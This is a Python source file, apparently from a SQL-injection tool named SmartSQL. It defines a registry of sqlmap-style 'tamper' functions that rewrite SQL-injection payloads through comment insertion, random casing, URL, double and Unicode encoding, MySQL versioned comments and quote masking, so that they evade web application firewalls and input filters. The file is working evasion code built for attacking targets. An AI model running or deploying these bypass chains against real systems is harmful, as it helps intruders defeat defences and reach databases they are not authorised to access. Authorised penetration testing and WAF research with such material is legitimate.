"""Tamper engine: payload transforms used to evade WAFs and input filters.

Each tamper is a pure ``str -> str`` function registered by name. The adaptive
selector (see :mod:`smartsql.adaptive`) composes them into *chains* and scores
those chains by how often they get a request past the target's filters.

Tampers here intentionally mirror the well-understood techniques from tools
like sqlmap so operators get familiar, predictable behaviour - but the
*selection* of which chain to use is what SmartSQL automates.
"""

from __future__ import annotations

import random
import re
from typing import Callable, Dict, List

Tamper = Callable[[str], str]

_REGISTRY: Dict[str, "TamperSpec"] = {}


class TamperSpec:
    """Metadata + implementation for a single tamper."""

    def __init__(
        self,
        name: str,
        func: Tamper,
        description: str,
        # 'aggressiveness' roughly orders tampers from least to most
        # disruptive; the adaptor escalates through these levels.
        level: int = 1,
        dbms: str = "any",
    ) -> None:
        self.name = name
        self.func = func
        self.description = description
        self.level = level
        self.dbms = dbms

    def __call__(self, payload: str) -> str:
        return self.func(payload)


def register(name: str, description: str, level: int = 1, dbms: str = "any"):
    """Decorator to register a tamper function under ``name``."""

    def _wrap(func: Tamper) -> Tamper:
        _REGISTRY[name] = TamperSpec(name, func, description, level, dbms)
        return func

    return _wrap


def get(name: str) -> TamperSpec:
    return _REGISTRY[name]


def all_names() -> List[str]:
    return sorted(_REGISTRY.keys())


def specs() -> List[TamperSpec]:
    return sorted(_REGISTRY.values(), key=lambda s: (s.level, s.name))


def apply_chain(payload: str, chain: List[str]) -> str:
    """Apply a sequence of tampers, left to right, to ``payload``."""
    out = payload
    for name in chain:
        spec = _REGISTRY.get(name)
        if spec is not None:
            out = spec(out)
    return out


# --------------------------------------------------------------------------- #
# Tamper implementations
# --------------------------------------------------------------------------- #


@register("space2comment", "Replace spaces with /**/ inline comments", level=1)
def space2comment(payload: str) -> str:
    return payload.replace(" ", "/**/")


@register("space2plus", "Replace spaces with + (URL space)", level=1)
def space2plus(payload: str) -> str:
    return payload.replace(" ", "+")


@register("randomcase", "Randomise the case of keyword characters", level=1)
def randomcase(payload: str) -> str:
    return "".join(
        c.upper() if random.random() > 0.5 else c.lower() for c in payload
    )


@register("charencode", "URL-encode every character", level=2)
def charencode(payload: str) -> str:
    return "".join(f"%{ord(c):02x}" for c in payload)


@register(
    "charunicodeencode",
    "Unicode-escape every character (%u00xx)",
    level=3,
)
def charunicodeencode(payload: str) -> str:
    return "".join(f"%u{ord(c):04x}" for c in payload)


@register("equaltolike", "Replace = with LIKE", level=2)
def equaltolike(payload: str) -> str:
    return re.sub(r"\s*=\s*", " LIKE ", payload)


@register(
    "between",
    "Replace '> X' with 'NOT BETWEEN 0 AND X' style comparisons",
    level=2,
)
def between(payload: str) -> str:
    # A light-weight variant: turn '=' into a BETWEEN range where possible.
    return re.sub(
        r"(\b\w+\b)\s*=\s*(\d+)",
        lambda m: f"{m.group(1)} BETWEEN {m.group(2)} AND {m.group(2)}",
        payload,
    )


@register(
    "space2randomblank",
    "Replace spaces with a random whitespace character",
    level=2,
)
def space2randomblank(payload: str) -> str:
    blanks = ["%09", "%0a", "%0c", "%0d", "%0b"]
    return re.sub(r" ", lambda _: random.choice(blanks), payload)


@register(
    "randomcomments",
    "Insert /**/ inside SQL keywords (e.g. UN/**/ION)",
    level=3,
)
def randomcomments(payload: str) -> str:
    keywords = [
        "UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "ORDER", "GROUP",
        "INSERT", "UPDATE", "DELETE", "LIMIT", "SLEEP", "BENCHMARK",
    ]

    def _mangle(match: re.Match) -> str:
        word = match.group(0)
        if len(word) < 2:
            return word
        pos = random.randint(1, len(word) - 1)
        return word[:pos] + "/**/" + word[pos:]

    pattern = re.compile("|".join(keywords), re.IGNORECASE)
    return pattern.sub(_mangle, payload)


@register(
    "versionedmorekeywords",
    "MySQL versioned comments around keywords (/*!50000UNION*/)",
    level=3,
    dbms="MySQL",
)
def versionedmorekeywords(payload: str) -> str:
    keywords = [
        "UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "GROUP", "ORDER",
        "LIMIT", "SLEEP", "BENCHMARK",
    ]
    pattern = re.compile("|".join(keywords), re.IGNORECASE)
    return pattern.sub(lambda m: f"/*!50000{m.group(0)}*/", payload)


@register("apostrophemask", "Replace ' with UTF-8 full-width quote", level=3)
def apostrophemask(payload: str) -> str:
    return payload.replace("'", "%EF%BC%87")


@register(
    "space2hash",
    "Replace spaces with #<random>%0A (MySQL comment newline)",
    level=3,
    dbms="MySQL",
)
def space2hash(payload: str) -> str:
    def _sub(_):
        junk = "".join(random.choice("0123456789abcdef") for _ in range(4))
        return f"%23{junk}%0A"

    return re.sub(r" ", _sub, payload)


@register("doubleencode", "Double URL-encode every character", level=4)
def doubleencode(payload: str) -> str:
    once = "".join(f"%{ord(c):02x}" for c in payload)
    return once.replace("%", "%25")


@register(
    "commentbeforeparentheses",
    "Insert an inline comment before opening parentheses",
    level=2,
)
def commentbeforeparentheses(payload: str) -> str:
    return payload.replace("(", "/**/(")
